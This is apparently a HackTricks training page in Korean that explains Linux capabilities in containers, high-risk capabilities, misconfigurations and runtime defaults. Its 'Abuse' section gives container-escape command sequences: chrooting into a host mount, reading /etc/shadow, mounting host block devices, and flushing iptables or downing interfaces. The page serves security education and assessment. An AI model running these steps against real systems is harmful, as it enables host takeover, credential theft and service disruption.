# Linux Capabilities In Containers

{{#include ../../../../banners/hacktricks-training.md}}

## 개요

Linux capabilities는 컨테이너 보안에서 가장 중요한 요소들 중 하나입니다. 이는 미묘하지만 근본적인 질문에 답하기 때문입니다: **컨테이너 내부에서 "root"는 실제로 무엇을 의미하는가?** 일반적인 Linux 시스템에서 UID 0은 역사적으로 매우 광범위한 권한 집합을 의미했습니다. 현대 커널에서는 해당 권한이 capabilities라고 불리는 더 작은 단위로 분해됩니다. 관련 capabilities가 제거되면, 프로세스가 root로 실행되더라도 많은 강력한 작업을 수행하지 못할 수 있습니다.

컨테이너는 이 구분에 크게 의존합니다. 많은 워크로드가 호환성이나 단순성 때문에 여전히 컨테이너 내부에서 UID 0으로 실행됩니다. capabilities를 제거하지 않으면 이는 매우 위험합니다. capabilities를 제거하면, 컨테이너화된 root 프로세스는 많은 일반적인 컨테이너 내부 작업을 계속 수행할 수 있으면서 더 민감한 커널 작업은 차단됩니다. 그래서 `uid=0(root)`를 표시하는 컨테이너 셸이 자동으로 "host root"나 심지어 "broad kernel privilege"를 의미하지는 않습니다. capability 세트가 그 root 정체성이 실제로 어느 정도의 가치가 있는지를 결정합니다.

For the full Linux capability reference and many abuse examples, see:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## 동작

Capabilities는 permitted, effective, inheritable, ambient, bounding 세트 등 여러 세트로 추적됩니다. 많은 컨테이너 평가에서는 각 세트의 정확한 커널 의미론보다 더 즉시 중요한 것은 실무적 최종 질문입니다: **이 프로세스가 지금 당장 성공적으로 수행할 수 있는 권한 있는 작업은 무엇이며, 앞으로 획득할 수 있는 권한은 무엇인가?**

이것이 중요한 이유는 많은 breakout techniques가 사실 컨테이너 문제로 위장한 capability 문제이기 때문입니다. `CAP_SYS_ADMIN`을 가진 워크로드는 일반 컨테이너 root 프로세스가 건드려서는 안 되는 방대한 커널 기능에 접근할 수 있습니다. `CAP_NET_ADMIN`을 가진 워크로드는 호스트 네트워크 네임스페이스를 공유할 경우 훨씬 더 위험해집니다. `CAP_SYS_PTRACE`를 가진 워크로드는 host PID 공유를 통해 호스트 프로세스를 볼 수 있다면 훨씬 더 흥미로워집니다. Docker나 Podman에서는 이는 `--pid=host`로 나타날 수 있고, Kubernetes에서는 보통 `hostPID: true`로 나타납니다.

다시 말해, capability 세트는 단독으로 평가할 수 없습니다. namespaces, seccomp, MAC policy와 함께 고려되어야 합니다.

## 실습

컨테이너 내부에서 capabilities를 직접 검사하는 매우 간단한 방법은 다음과 같습니다:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
더 제한된 컨테이너를 모든 capabilities가 추가된 컨테이너와 비교할 수도 있습니다:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
좁은 추가의 효과를 확인하려면, 모든 것을 제거하고 하나의 capability만 다시 추가해 보세요:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
이 작은 실험들은 runtime이 단순히 "privileged"라는 불리언을 토글하는 것이 아니라 프로세스가 이용할 수 있는 실제 권한 표면을 형성한다는 것을 보여준다.

## High-Risk Capabilities

대상에 따라 많은 capabilities가 중요할 수 있지만, 컨테이너 탈출 분석에서 반복적으로 관련되는 것들이 있다.

**`CAP_SYS_ADMIN`** 은 수비자가 가장 의심해야 할 권한이다. 마운트 관련 작업, namespace 민감 동작, 그리고 컨테이너에 무심코 노출되어서는 안 되는 많은 커널 경로를 포함해 엄청난 기능을 열어주기 때문에 종종 "the new root"로 묘사된다. 컨테이너에 `CAP_SYS_ADMIN`, 약한 seccomp, 그리고 강력한 MAC 격리가 없으면 많은 전형적인 breakout 경로가 훨씬 현실화된다.

**`CAP_SYS_PTRACE`** 는 프로세스 가시성이 존재할 때 중요하다. 특히 PID namespace가 호스트나 인접한 흥미로운 워크로드와 공유되는 경우에 그렇다. 이 권한은 가시성을 조작으로 바꿀 수 있다.

**`CAP_NET_ADMIN`** 과 **`CAP_NET_RAW`** 는 네트워크 중심 환경에서 중요하다. 격리된 브리지 네트워크에서는 이미 위험할 수 있고, 호스트 네트워크 namespace를 공유하는 경우에는 훨씬 더 위험하다. 워크로드가 호스트 네트워킹을 재구성하거나 스니핑, 스푸핑, 로컬 트래픽 흐름을 방해할 수 있기 때문이다.

**`CAP_SYS_MODULE`** 는 대개 루트풀(rootful) 환경에서 치명적이다. 커널 모듈을 로드하는 것은 사실상 호스트 커널 제어에 해당하므로 일반 목적의 컨테이너 워크로드에 나타나서는 안 된다.

## Runtime Usage

Docker, Podman, containerd-based 스택과 CRI-O는 모두 capability 제어를 사용하지만, 기본값과 관리 인터페이스는 다르다. Docker는 `--cap-drop`과 `--cap-add` 같은 플래그를 통해 매우 직접적으로 노출한다. Podman도 유사한 제어를 제공하며 rootless 실행이 추가적인 안전 계층으로 자주 유리하다. Kubernetes는 Pod 또는 컨테이너의 `securityContext`를 통해 capability 추가/제거를 노출한다. LXC/Incus 같은 system-container 환경도 capability 제어에 의존하지만, 이러한 시스템의 광범위한 호스트 통합 때문에 운영자가 app-container 환경보다 기본 설정을 더 느슨하게 만드는 유혹을 받는 경우가 많다.

모든 환경에 공통되는 원칙은 이렇다: 기술적으로 부여할 수 있다고 해서 반드시 부여해야 하는 것은 아니다. 많은 실제 사고는 운영자가 워크로드가 더 엄격한 구성에서 실패하자 간단한 수단으로 capability를 추가하면서 시작된다.

## Misconfigurations

가장 명백한 실수는 Docker/Podman 스타일 CLI에서의 **`--cap-add=ALL`** 이지만, 이것만이 문제는 아니다. 실제로 더 흔한 문제는 하나 또는 두 개의 매우 강력한 capability, 특히 `CAP_SYS_ADMIN`을 "애플리케이션이 작동하도록" 부여하면서 namespace, seccomp, mount 영향 등을 제대로 이해하지 못하는 것이다. 또 다른 흔한 실패 모드는 추가 capabilities를 호스트 namespace 공유와 결합하는 것이다. Docker나 Podman에서는 이것이 `--pid=host`, `--network=host`, 또는 `--userns=host`로 나타날 수 있고; Kubernetes에서는 보통 `hostPID: true` 또는 `hostNetwork: true` 같은 워크로드 설정을 통해 동등한 노출이 발생한다. 이러한 각 조합은 해당 capability가 실제로 무엇에 영향을 미칠 수 있는지를 변경한다.

워크로드가 완전히 `--privileged`하지 않다고 해서 의미 있게 제약되어 있다고 관리자들이 믿는 경우도 흔하다. 때로는 그 말이 맞지만, 때로는 실제 태세가 이미 privileged에 충분히 근접해 있어 그 구분이 운영상으로는 더 이상 중요하지 않을 수 있다.

## Abuse

첫 번째 실무 단계는 유효한 capability 집합을 열거하고 즉시 escape 또는 호스트 정보 접근에 영향을 줄 수 있는 capability별 동작을 테스트하는 것이다:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
만약 `CAP_SYS_ADMIN`이(가) 존재한다면, 먼저 mount-based abuse와 host filesystem access를 테스트하세요. 이는 탈출을 가장 흔히 가능하게 하는 권한들 중 하나입니다:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
`CAP_SYS_PTRACE`가 존재하고 컨테이너가 흥미로운 프로세스를 볼 수 있다면, 해당 capability를 프로세스 조사로 전환할 수 있는지 확인하세요:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
만약 `CAP_NET_ADMIN` 또는 `CAP_NET_RAW`가 있다면, 워크로드가 노출된 네트워크 스택을 조작할 수 있는지 또는 적어도 유용한 네트워크 인텔리전스를 수집할 수 있는지 테스트하세요:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
capability test가 성공하면 namespace 상황과 결합하세요. 격리된 namespace에서 단순히 위험해 보이는 capability가 컨테이너가 host PID, host network, 또는 host mounts를 공유하는 경우 즉시 escape 또는 host-recon primitive가 될 수 있습니다.

### 전체 예시: `CAP_SYS_ADMIN` + Host Mount = Host Escape

컨테이너가 `CAP_SYS_ADMIN`을 가지고 있고 `/host`와 같은 host filesystem의 writable bind mount가 있는 경우, escape 경로는 종종 단순합니다:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
만약 `chroot`가 성공하면, 명령은 이제 호스트 루트 파일시스템 컨텍스트에서 실행된다:
```bash
id
hostname
cat /etc/shadow | head
```
만약 `chroot`를 사용할 수 없다면, 마운트된 트리에서 바이너리를 호출하여 동일한 결과를 얻을 수 있는 경우가 많습니다:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### 전체 예제: `CAP_SYS_ADMIN` + 디바이스 액세스

호스트의 블록 디바이스가 노출되면, `CAP_SYS_ADMIN`은 이를 직접적인 호스트 파일시스템 접근으로 전환할 수 있습니다:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### 전체 예제: `CAP_NET_ADMIN` + 호스트 네트워킹

이 조합이 항상 host root 권한을 직접적으로 획득하게 해주는 것은 아니지만, 호스트 네트워크 스택을 완전히 재구성할 수 있습니다:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
이는 denial of service, traffic interception 또는 이전에 필터링되었던 서비스에 대한 접근을 가능하게 할 수 있다.

## 검사

capability checks의 목표는 단순히 raw values를 덤프하는 것이 아니라, 프로세스가 현재의 namespace 및 mount 상황을 위험하게 만들 만큼의 권한을 가지고 있는지를 이해하는 것이다.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
여기서 주목할 점:

- `capsh --print`는 `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, 또는 `cap_sys_module` 같은 고위험 capabilities를 찾는 가장 쉬운 방법이다.
- `/proc/self/status`의 `CapEff` 줄은 다른 세트에서 사용 가능할 수 있는 것이 아니라 지금 실제로 유효한 것이 무엇인지 알려준다.
- 컨테이너가 호스트 PID, 네트워크 또는 사용자 네임스페이스를 공유하거나 쓰기 가능한 호스트 마운트를 가지고 있는 경우, capability 덤프는 훨씬 더 중요해진다.

원시 capability 정보를 수집한 뒤 다음 단계는 해석이다. 프로세스가 root인지, user namespaces가 활성화되어 있는지, 호스트 네임스페이스가 공유되는지, seccomp가 적용되고 있는지, AppArmor나 SELinux가 여전히 프로세스를 제한하는지 등을 확인하라. capability 세트 자체는 이야기의 일부일 뿐이지만, 동일해 보이는 시작점에서 왜 어떤 컨테이너 탈출은 성공하고 다른 것은 실패하는지를 설명하는 경우가 자주 있다.

## 런타임 기본값

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 기본적으로 축소된 capability 세트 | Docker는 기본적으로 capability의 allowlist를 유지하고 나머지는 제거한다 | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | 기본적으로 축소된 capability 세트 | Podman 컨테이너는 기본적으로 unprivileged이며 축소된 capability 모델을 사용한다 | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | 변경되지 않으면 런타임 기본값을 상속 | If no `securityContext.capabilities` are specified, the container gets the default capability set from the runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | 보통 런타임 기본값 | 실제 세트는 런타임과 Pod 스펙에 따라 달라진다 | Kubernetes 행과 동일; 직접 OCI/CRI 구성으로도 capabilities를 명시적으로 추가할 수 있다 |

Kubernetes에서 중요한 점은 API가 하나의 보편적인 기본 capability 세트를 정의하지 않는다는 것이다. Pod가 capabilities를 추가하거나 제거하지 않으면 워크로드는 해당 노드의 런타임 기본값을 상속한다.
